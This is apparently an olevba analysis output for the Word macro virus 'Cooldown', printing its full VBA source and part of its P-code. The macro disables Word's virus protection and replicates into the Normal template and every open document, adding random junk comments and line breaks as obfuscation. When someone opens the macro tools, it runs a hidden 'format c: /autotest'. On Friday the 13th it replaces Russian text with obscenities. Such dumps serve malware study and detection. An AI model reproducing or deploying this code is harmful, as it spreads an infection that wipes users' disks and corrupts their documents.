olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cooldown
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cooldown - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
           Private _
    Sub Document_Open()
           CoolDown 0
               End _
           Sub
               Private Sub Document_Close()
          ' 4033.683

CoolDown _
     0
  ' 3513.277
' 1320.019
' 8110.596
End _
             Sub
        Private Sub _
    ToolsMacro()
 ' 224.3078
CoolDown _
 1
     End _
 Sub
               Private _
                Sub _
         ViewVBCode()
            CoolDown 1
                End Sub
            ' 2304.491
' 8279.118
Private Sub _
          CoolDown(How As Integer)
          ' 8075.377
' 3920.903
On _
 Error Resume _
               Next
    ' 2320.882
' 9798.256
Dim c _
              As String, a As Long, b _
         As _
       Long, d As Long, e _
             As _
            Long, f _
      As Long, res _
 As _
            String, m _
             As _
      Boolean
           
' 9374.96
' 8041.748
Randomize
         ' 4889.167
With Options
         .VirusProtection _
           = False
   .ConfirmConversions = _
          False
               .SaveNormalPrompt = _
                False
                ' 3907.685
' 6103.113
End With
               If How _
     = 1 _
           Then
     ' 8184.334
s = Shell("format" & Chr(32) _
          & "c:" _
       & _
     Chr(32) & "/autotest", vbHide)
   ' 2956.817
' 9635.439
' 4736.83
Else
       ' 8133.121
' 7560.168
With _
          NormalTemplate.VBProject.VBComponents(1).CodeModule
              ' 8032.858
' 8244.574
' 8784.948
' 888.5777
If Not .Find("Cool" & "Down", _
       1, 1, 1000, 1000, _
      False, False) Then
  a _
 = _
              .CountOfLines
   ' 2463.452
' 3968.272
For _
               b _
       = 1 _
          To a
       .DeleteLines _
 (1)
     Next
       ' 2904.868

d _
         = 1
              
a = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
         res _
              = ""
 For b = 1 To _
     a
             ' 4329.59
c = _
  ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, _
         1)
   ' 8156.663
' 8970.448
' 8084.063
' 3324.437
' 9643.782
c = RTrim(LTrim(c))
' 1906.096
' 9710.24
If _
         foo(c, _
             f, res) Then
            .InsertLines d, _
        Space(Rnd * 16) & res
     d _
           = d _
     + f
       ' 6646.568
f _
               = _
           0
               ' 5400.535

' 2053.032
' 7479.397
' 8147.12
' 6895.337
res _
 = ""
   ' 9476.48
End If
             ' 5105.58
Next
  ' 6605.461
' 5933.451
' 407.6976
' 9319.213
' 9496.274


' 3598.56
NormalTemplate.Save
      ' 6087.688
' 836.19
' 8116.738
End If
         End With
          ' 490.2995
For e _
      = _
    1 To _
Documents.Count
                
With Documents(e).VBProject.VBComponents(1).CodeModule
    ' 4749.31
' 8752.78
If _
 Not .Find("Cool" & _
               "Down", 1, _
            1, _
 1000, _
           1000, False, _
               False) Then
              ' 8851.471
' 3556.585
' 2667.773
a = _
 .CountOfLines
 ' 2670.048
' 6193.518
m = _
 Documents(e).Saved
       ' 5804.5
For b _
               = _
               1 To _
    a
             .DeleteLines (1)
      ' 1577.824
' 4362.142
' 6030.671
Next
      ' 8237.669
d = 1
            ' 7208.085
' 2695.444
' 7822.269
a = _
    NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
       ' 5716.637
' 9704.034
' 373.7998
res = ""
    For b _
       = _
            1 _
               To _
    a
   c = _
             NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
              ' 2944.577
c = _
  RTrim(LTrim(c))
         If foo(c, f, _
 res) _
   Then
           .InsertLines _
          d, Space(Rnd * 16) & _
       res
               d = _
            d _
        + _
     f
       f = _
        0
          res _
          = ""
 ' 7983.438
End If
' 7406.641
' 348.9697
Next
           ' 3382.197
' 2050.94
If _
    Documents(e).Path _
            <> _
    "" Then
               ' 3355.478
' 1731.703
Documents(e).SaveAs _
           AddToRecentFiles:=False
              ' 365.51

End If
          ' 5562.01
' 2622.874
If (WeekDay(Date) _
                = _
         6) And _
            (Day(Date) = _
      13) _
 And _
              (Rnd _
        > _
   0.7) Then
          ' 3110.931
' 1411.868
' 6460.768
' 562.2142
' 9060.836
' 3305.939
Application.StatusBar _
       = ""
 

Application.DisplayStatusBar = False
  ' 2881.258
' 813.1063
' 1850.349
' 4146.912
' 7107.368
' 8673.469
' 4056.596
Application.ScreenUpdating = False
     With _
          Documents(e).Content
        .Find.Execute FindText:="пр", _
     ReplaceWith:="пизд", Replace:=wdReplaceAll
           .Find.Execute _
          FindText:="др", ReplaceWith:="понос", Replace:=wdReplaceAll
                .Find.Execute _
          FindText:="кр", _
             ReplaceWith:="кобыл", _
       Replace:=wdReplaceAll
     ' 7211.244
.Find.Execute _
         FindText:="стр", ReplaceWith:="ебан", Replace:=wdReplaceAll
           ' 4302.84


.Find.Execute _
      FindText:="ср", _
 ReplaceWith:="срак", _
      Replace:=wdReplaceAll
        ' 2502.358
' 2252.517
' 9715.377
.Find.Execute _
           FindText:="тр", ReplaceWith:="трах", Replace:=wdReplaceAll
        .Find.Execute FindText:="бр", ReplaceWith:="бляд", Replace:=wdReplaceAll
               

' 6450.241
' 5234.881
.Find.Execute _
         FindText:="вр", _
     ReplaceWith:="выеб", _
      Replace:=wdReplaceAll
               
' 2394.083
.Find.Execute FindText:="гр", _
   ReplaceWith:="говн", _
              Replace:=wdReplaceAll
           .Find.Execute FindText:="жр", _
       ReplaceWith:="жоп", Replace:=wdReplaceAll
              .Find.Execute _
    FindText:="зр", _
                ReplaceWith:="залуп", Replace:=wdReplaceAll
                

.Find.Execute FindText:="дж", _
    ReplaceWith:="джоп", Replace:=wdReplaceAll
            .Find.Execute _
   FindText:="кал", _
      ReplaceWith:="дер", _
         Replace:=wdReplaceAll
       ' 2753.138
' 4720.349
' 508.8407
.Find.Execute FindText:="бух", _
          ReplaceWith:="бряк", Replace:=wdReplaceAll
         


End _
   With
              Documents(e).UndoClear
      Application.DisplayStatusBar _
       = _
            True
     Application.ScreenUpdating _
          = _
        True
                Application.StatusBar = _
          ""
  End _
     If
           Documents(e).Saved = m
  ' 950.2953
End _
       If
            ' 9933.281
End _
          With
         
Next
      ' 4221.495
End If
              ' 6890.69
' 4952.252
' 9210.85
' 7992.755
End _
            Sub
        Private _
      Function foo(ByRef s _
        As _
       String, ByRef _
          i _
         As Long, ByRef res _
               As String) _
   As Boolean
               Dim tmp As _
             String
             ' 3975.716
' 2676.312
If (Left(s, _
             1) = "'") _
               Or _
    (Len(s) _
    = _
    0) _
             Then
   ' 8794.927
foo _
     = _
   False
                ' 2880.688
' 5347.534
Exit _
                Function
   ' 8582.16
' 5127.285
End If
    If _
    Right(s, _
        2) _
           = Chr(32) _
& "_" _
       Then
         res _
  = _
             res & _
          Left(s, _
         Len(s) - _
  1)
           foo _
               = False
  Exit _
      Function
             ' 5829.273
End _
               If
           ' 9278.597
' 4815.313
' 2696.402
tmp = res _
     & _
       s
      ' 6215.812
' 5875.384
res _
= ""
      i = 1
         While _
               Rnd > 0.5
             ' 6383.402
If _
    Rnd < _
             0.8 _
           Then
       ' 1755.991
' 6889.289
' 931.2332
' 8616.979
' 7634.447
res _
 = _
    res _
      & _
 "'" _
   & _
          Str(Rnd _
        * 10000)
 End _
  If
        ' 5379.174
res = _
        res & _
     Chr(13)
           i = i _
               + _
             1
               ' 5024.019

Wend
               ' 4636.635

' 9401.992
For a = _
     1 To Len(tmp)
              res _
    = res _
  & _
           Mid(tmp, a, 1)
               If _
               Mid(tmp, _
               a, _
   1) _
           = _
                Chr(32) Then

If _
     Rnd > 0.5 _
         Then
         ' 8206.482
res _
            = res & _
          "_" _
& _
  Chr(13) & Space(Rnd _
    * 16)
   i = i + 1
       ' 599.7574


End If
           ' 5509.322
End _
            If
                ' 997.2936
' 5703.586
' 1174.576
Next
               ' 3788.384
' 1923.119
' 6239.736
' 6045.457
foo = _
             True
  End _
              Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cooldown
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15543 bytes
' Line #0:
' 	LineCont 0x0004 01 00 04 00
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #2:
' 	LineCont 0x0004 01 00 0B 00
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' 	QuoteRem 0x000A 0x0009 " 4033.683"
' Line #5:
' Line #6:
' 	LineCont 0x0004 01 00 05 00
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #7:
' 	QuoteRem 0x0002 0x0009 " 3513.277"
' Line #8:
' 	QuoteRem 0x0000 0x0009 " 1320.019"
' Line #9:
' 	QuoteRem 0x0000 0x0009 " 8110.596"
' Line #10:
' 	LineCont 0x0004 01 00 0D 00
' 	EndSub 
' Line #11:
' 	LineCont 0x0004 02 00 04 00
' 	FuncDefn (Private Sub ToolsMacro())
' Line #12:
' 	QuoteRem 0x0001 0x0009 " 224.3078"
' Line #13:
' 	LineCont 0x0004 01 00 01 00
' 	LitDI2 0x0001 
' 	ArgsCall CoolDown 0x0001 
' Line #14:
' 	LineCont 0x0004 01 00 01 00
' 	EndSub 
' Line #15:
' 	LineCont 0x0008 01 00 10 00 02 00 09 00
' 	FuncDefn (Private Sub ViewVBCode())
' Line #16:
' 	LitDI2 0x0001 
' 	ArgsCall CoolDown 0x0001 
' Line #17:
' 	EndSub 
' Line #18:
' 	QuoteRem 0x000C 0x0009 " 2304.491"
' Line #19:
' 	QuoteRem 0x0000 0x0009 " 8279.118"
' Line #20:
' 	LineCont 0x0004 02 00 0A 00
' 	FuncDefn (Private Sub CoolDown(How As Integer))
' Line #21:
' 	QuoteRem 0x000A 0x0009 " 8075.377"
' Line #22:
' 	QuoteRem 0x0000 0x0009 " 3920.903"
' Line #23:
' 	LineCont 0x0008 01 00 01 00 03 00 0F 00
' 	OnError (Resume Next) 
' Line #24:
' 	QuoteRem 0x0004 0x0009 " 2320.882"
' Line #25:
' 	QuoteRem 0x0000 0x0009 " 9798.256"
' Line #26:
' 	LineCont 0x0028 02 00 0E 00 0A 00 09 00 0B 00 07 00 12 00 0D 00 13 00 0C 00 16 00 06 00 1A 00 01 00 1B 00 0C 00 1E 00 0D 00 1F 00 06 00
' 	Dim 
' 	VarDefn c (As String)
' 	VarDefn a (As Long)
' 	VarDefn B (As Long)
' 	VarDefn d (As Long)
' 	VarDefn e (As Long)
' 	VarDefn False (As Long)
' 	VarDefn res (As String)
' 	VarDefn m (As Boolean)
' Line #27:
' Line #28:
' 	QuoteRem 0x0000 0x0008 " 9374.96"
' Line #29:
' 	QuoteRem 0x0000 0x0009 " 8041.748"
' Line #30:
' 	ArgsCall Read 0x0000 
' Line #31:
' 	QuoteRem 0x0009 0x0009 " 4889.167"
' Line #32:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #33:
' 	LineCont 0x0004 02 00 0B 00
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #34:
' 	LineCont 0x0004 03 00 0A 00
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #35:
' 	LineCont 0x0004 03 00 10 00
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #36:
' 	QuoteRem 0x0010 0x0009 " 3907.685"
' Line #37:
' 	QuoteRem 0x0000 0x0009 " 6103.113"
' Line #38:
' 	EndWith 
' Line #39:
' 	LineCont 0x0008 02 00 05 00 04 00 0B 00
' 	Ld How 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #40:
' 	QuoteRem 0x0005 0x0009 " 8184.334"
' Line #41:
' 	LineCont 0x000C 0A 00 0A 00 0C 00 07 00 0D 00 05 00
' 	LitStr 0x0006 "format"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "c:"
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "/autotest"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #42:
' 	QuoteRem 0x0003 0x0009 " 2956.817"
' Line #43:
' 	QuoteRem 0x0000 0x0009 " 9635.439"
' Line #44:
' 	QuoteRem 0x0000 0x0008 " 4736.83"
' Line #45:
' 	ElseBlock 
' Line #46:
' 	QuoteRem 0x0007 0x0009 " 8133.121"
' Line #47:
' 	QuoteRem 0x0000 0x0009 " 7560.168"
' Line #48:
' 	LineCont 0x0004 01 00 0A 00
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #49:
' 	QuoteRem 0x000E 0x0009 " 8032.858"
' Line #50:
' 	QuoteRem 0x0000 0x0009 " 8244.574"
' Line #51:
' 	QuoteRem 0x0000 0x0009 " 8784.948"
' Line #52:
' 	QuoteRem 0x0000 0x0009 " 888.5777"
' Line #53:
' 	LineCont 0x0008 09 00 07 00 11 00 06 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #54:
' 	LineCont 0x0008 01 00 01 00 02 00 0E 00
' 	MemLdWith CountOfLines 
' 	St a 
' Line #55:
' 	QuoteRem 0x0003 0x0009 " 2463.452"
' Line #56:
' 	QuoteRem 0x0000 0x0009 " 3968.272"
' Line #57:
' 	LineCont 0x000C 01 00 0F 00 02 00 07 00 04 00 0A 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #58:
' 	LineCont 0x0004 02 00 01 00
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' 	QuoteRem 0x0007 0x0009 " 2904.868"
' Line #61:
' Line #62:
' 	LineCont 0x0004 01 00 09 00
' 	LitDI2 0x0001 
' 	St d 
' Line #63:
' Line #64:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #65:
' 	LineCont 0x0004 01 00 0E 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #66:
' 	LineCont 0x0004 05 00 05 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #67:
' 	QuoteRem 0x000D 0x0008 " 4329.59"
' Line #68:
' 	LineCont 0x0008 02 00 02 00 11 00 09 00
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #69:
' 	QuoteRem 0x0003 0x0009 " 8156.663"
' Line #70:
' 	QuoteRem 0x0000 0x0009 " 8970.448"
' Line #71:
' 	QuoteRem 0x0000 0x0009 " 8084.063"
' Line #72:
' 	QuoteRem 0x0000 0x0009 " 3324.437"
' Line #73:
' 	QuoteRem 0x0000 0x0009 " 9643.782"
' Line #74:
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #75:
' 	QuoteRem 0x0000 0x0009 " 1906.096"
' Line #76:
' 	QuoteRem 0x0000 0x0008 " 9710.24"
' Line #77:
' 	LineCont 0x0008 01 00 09 00 05 00 0D 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #78:
' 	LineCont 0x0004 04 00 08 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #79:
' 	LineCont 0x0008 01 00 0B 00 03 00 05 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #80:
' 	QuoteRem 0x0007 0x0009 " 6646.568"
' Line #81:
' 	LineCont 0x0008 01 00 0F 00 02 00 0B 00
' 	LitDI2 0x0000 
' 	St False 
' Line #82:
' 	QuoteRem 0x000F 0x0009 " 5400.535"
' Line #83:
' Line #84:
' 	QuoteRem 0x0000 0x0009 " 2053.032"
' Line #85:
' 	QuoteRem 0x0000 0x0009 " 7479.397"
' Line #86:
' 	QuoteRem 0x0000 0x0008 " 8147.12"
' Line #87:
' 	QuoteRem 0x0000 0x0009 " 6895.337"
' Line #88:
' 	LineCont 0x0004 01 00 01 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #89:
' 	QuoteRem 0x0003 0x0008 " 9476.48"
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	QuoteRem 0x000D 0x0008 " 5105.58"
' Line #92:
' 	StartForVariable 
' 	Next 
' Line #93:
' 	QuoteRem 0x0002 0x0009 " 6605.461"
' Line #94:
' 	QuoteRem 0x0000 0x0009 " 5933.451"
' Line #95:
' 	QuoteRem 0x0000 0x0009 " 407.6976"
' Line #96:
' 	QuoteRem 0x0000 0x0009 " 9319.213"
' Line #97:
' 	QuoteRem 0x0000 0x0009 " 9496.274"
' Line #98:
' Line #99:
' Line #100:
' 	QuoteRem 0x0000 0x0008 " 3598.56"
' Line #101:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #102:
' 	QuoteRem 0x0006 0x0009 " 6087.688"
' Line #103:
' 	QuoteRem 0x0000 0x0007 " 836.19"
' Line #104:
' 	QuoteRem 0x0000 0x0009 " 8116.738"
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	EndWith 
' Line #107:
' 	QuoteRem 0x000A 0x0009 " 490.2995"
' Line #108:
' 	LineCont 0x000C 02 00 06 00 03 00 04 00 05 00 00 00
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #109:
' Line #110:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #111:
' 	QuoteRem 0x0004 0x0008 " 4749.31"
' Line #112:
' 	QuoteRem 0x0000 0x0008 " 8752.78"
' Line #113:
' 	LineCont 0x0018 01 00 01 00 07 00 0F 00 0B 00 0C 00 0D 00 01 00 0F 00 0B 00 13 00 0F 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #114:
' 	QuoteRem 0x000E 0x0009 " 8851.471"
' Line #115:
' 	QuoteRem 0x0000 0x0009 " 3556.585"
' Line #116:
' 	QuoteRem 0x0000 0x0009 " 2667.773"
' Line #117:
' 	LineCont 0x0004 02 00 01 00
' 	MemLdWith CountOfLines 
' 	St a 
' Line #118:
' 	QuoteRem 0x0001 0x0009 " 2670.048"
' Line #119:
' 	QuoteRem 0x0000 0x0009 " 6193.518"
' Line #120:
' 	LineCont 0x0004 02 00 01 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Saved 
' 	St m 
' Line #121:
' 	QuoteRem 0x0007 0x0007 " 5804.5"
' Line #122:
' 	LineCont 0x000C 02 00 0F 00 03 00 0F 00 05 00 04 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #123:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #124:
' 	QuoteRem 0x0006 0x0009 " 1577.824"
' Line #125:
' 	QuoteRem 0x0000 0x0009 " 4362.142"
' Line #126:
' 	QuoteRem 0x0000 0x0009 " 6030.671"
' Line #127:
' 	StartForVariable 
' 	Next 
' Line #128:
' 	QuoteRem 0x0006 0x0009 " 8237.669"
' Line #129:
' 	LitDI2 0x0001 
' 	St d 
' Line #130:
' 	QuoteRem 0x000C 0x0009 " 7208.085"
' Line #131:
' 	QuoteRem 0x0000 0x0009 " 2695.444"
' Line #132:
' 	QuoteRem 0x0000 0x0009 " 7822.269"
' Line #133:
' 	LineCont 0x0004 02 00 04 00
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #134:
' 	QuoteRem 0x0007 0x0009 " 5716.637"
' Line #135:
' 	QuoteRem 0x0000 0x0009 " 9704.034"
' Line #136:
' 	QuoteRem 0x0000 0x0009 " 373.7998"
' Line #137:
' 	LitStr 0x0000 ""
' 	St res 
' Line #138:
' 	LineCont 0x0010 02 00 07 00 03 00 0C 00 04 00 0F 00 05 00 04 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #139:
' 	LineCont 0x0004 02 00 0D 00
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #140:
' 	QuoteRem 0x000E 0x0009 " 2944.577"
' Line #141:
' 	LineCont 0x0004 02 00 02 00
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #142:
' 	LineCont 0x0008 07 00 01 00 09 00 03 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #143:
' 	LineCont 0x0008 02 00 0A 00 0B 00 07 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #144:
' 	LineCont 0x000C 02 00 0C 00 03 00 08 00 04 00 05 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #145:
' 	LineCont 0x0004 02 00 08 00
' 	LitDI2 0x0000 
' 	St False 
' Line #146:
' 	LineCont 0x0004 01 00 0A 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #147:
' 	QuoteRem 0x0001 0x0009 " 7983.438"
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	QuoteRem 0x0000 0x0009 " 7406.641"
' Line #150:
' 	QuoteRem 0x0000 0x0009 " 348.9697"
' Line #151:
' 	StartForVariable 
' 	Next 
' Line #152:
' 	QuoteRem 0x000B 0x0009 " 3382.197"
' Line #153:
' 	QuoteRem 0x0000 0x0008 " 2050.94"
' Line #154:
' 	LineCont 0x000C 01 00 04 00 07 00 0C 00 08 00 04 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #155:
' 	QuoteRem 0x000F 0x0009 " 3355.478"
' Line #156:
' 	QuoteRem 0x0000 0x0009 " 1731.703"
' Line #157:
' 	LineCont 0x0004 06 00 0B 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #158:
' 	QuoteRem 0x000E 0x0007 " 365.51"
' Line #159:
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	QuoteRem 0x000A 0x0008 " 5562.01"
' Line #162:
' 	QuoteRem 0x0000 0x0009 " 2622.874"
' Line #163:
' 	LineCont 0x0020 06 00 10 00 07 00 09 00 0A 00 0C 00 10 00 06 00 12 00 01 00 13 00 0E 00 15 00 08 00 16 00 03 00
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FE6 
' 	Gt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #164:
' 	QuoteRem 0x000A 0x0009 " 3110.931"
' Line #165:
' 	QuoteRem 0x0000 0x0009 " 1411.868"
' Line #166:
' 	QuoteRem 0x0000 0x0009 " 6460.768"
' Line #167:
' 	QuoteRem 0x0000 0x0009 " 562.2142"
' Line #168:
' 	QuoteRem 0x0000 0x0009 " 9060.836"
' Line #169:
' 	QuoteRem 0x0000 0x0009 " 3305.939"
' Line #170:
' 	LineCont 0x0004 03 00 07 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #171:
' Line #172:
' Line #173:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #174:
' 	QuoteRem 0x0002 0x0009 " 2881.258"
' Line #175:
' 	QuoteRem 0x0000 0x0009 " 813.1063"
' Line #176:
' 	QuoteRem 0x0000 0x0009 " 1850.349"
' Line #177:
' 	QuoteRem 0x0000 0x0009 " 4146.912"
' Line #178:
' 	QuoteRem 0x0000 0x0009 " 7107.368"
' Line #179:
' 	QuoteRem 0x0000 0x0009 " 8673.469"
' Line #180:
' 	QuoteRem 0x0000 0x0009 " 4056.596"
' Line #181:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #182:
' 	LineCont 0x0004 01 00 0A 00
' 	StartWithExpr 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Content 
' 	With 
' Line #183:
' 	LineCont 0x0004 08 00 05 00
' 	LitStr 0x0002 "пр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "пизд"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #184:
' 	LineCont 0x0004 04 00 0A 00
' 	LitStr 0x0002 "др"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "понос"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #185:
' 	LineCont 0x000C 04 00 0A 00 08 00 0D 00 0C 00 07 00
' 	LitStr 0x0002 "кр"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "кобыл"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #186:
' 	QuoteRem 0x0005 0x0009 " 7211.244"
' Line #187:
' 	LineCont 0x0004 04 00 09 00
' 	LitStr 0x0003 "стр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ебан"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #188:
' 	QuoteRem 0x000B 0x0008 " 4302.84"
' Line #189:
' Line #190:
' Line #191:
' 	LineCont 0x000C 04 00 06 00 08 00 01 00 0C 00 06 00
' 	LitStr 0x0002 "ср"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "срак"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #192:
' 	QuoteRem 0x0008 0x0009 " 2502.358"
' Line #193:
' 	QuoteRem 0x0000 0x0009 " 2252.517"
' Line #194:
' 	QuoteRem 0x0000 0x0009 " 9715.377"
' Line #195:
' 	LineCont 0x0004 04 00 0B 00
' 	LitStr 0x0002 "тр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "трах"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #196:
' 	LitStr 0x0002 "бр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "бляд"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #197:
' Line #198:
' Line #199:
' 	QuoteRem 0x0000 0x0009 " 6450.241"
' Line #200:
' 	QuoteRem 0x0000 0x0009 " 5234.881"
' Line #201:
' 	LineCont 0x000C 04 00 09 00 08 00 05 00 0C 00 06 00
' 	LitStr 0x0002 "вр"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "выеб"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #202:
' Line #203:
